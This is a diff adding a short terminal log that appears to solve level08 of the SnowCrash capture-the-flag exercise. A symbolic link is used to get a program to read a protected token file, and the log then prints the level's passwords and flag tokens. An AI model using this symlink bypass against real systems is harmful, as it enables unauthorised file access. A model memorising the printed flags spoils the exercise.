@@ -1,0 +1,16 @@
+level08@SnowCrash:~$ ln -s  $(pwd)/token /tmp/ptr
+ln: failed to create symbolic link `/tmp/ptr': File exists
+level08@SnowCrash:~$ ls
+level08  token
+level08@SnowCrash:~$ ln -s  $(pwd)/token /tmp/ptr1
+level08@SnowCrash:~$ ./level08 /tmp/ptr1
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+flag08@SnowCrash:~$ su level09
+Password: /25749xKZ8L7DkSCwJkT9dyv6f/
+level09@SnowCrash:~$
